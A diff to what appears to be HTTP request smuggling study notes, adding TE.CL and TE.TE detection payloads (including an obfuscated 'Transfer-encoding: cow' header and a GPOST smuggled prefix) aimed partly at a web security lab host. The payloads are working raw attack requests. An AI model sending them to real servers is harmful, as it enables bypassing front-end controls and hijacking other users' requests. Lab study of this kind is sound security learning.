@@ -30,7 +30,49 @@ GET /404 HTTP/1.1
 X: X
 ```
 
-#### Also exploitable if the server fails to process headers
+### TE.CL Detection
+```http
+POST / HTTP/1.1
+Host: vulnerable-site.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
+### TE.TE Detection
+
+Front reads first Transfer-Encoding, back reads last
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+```
+
+Also exploitable with chained TE headers
 
 ```http
 POST / HTTP/1.1
@@ -54,25 +96,6 @@ x=1
 0
 
 
-0
-
-
-```
-
-### TE.CL Detection
-```http
-POST / HTTP/1.1
-Host: vulnerable-site.com
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 4
-Transfer-Encoding: chunked
-
-5c
-GPOST / HTTP/1.1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 15
-
-x=1
 0
 
 
@@ -125,7 +148,7 @@ Often happens with:
 - Static Files
 - Server errors
 
-Must be on the same connection: Connection keep-alive.
+**Must be on the same connection: Connection keep-alive.**
 
 Can be abused to trigger a request from an internal host if the front prevents it. 
 
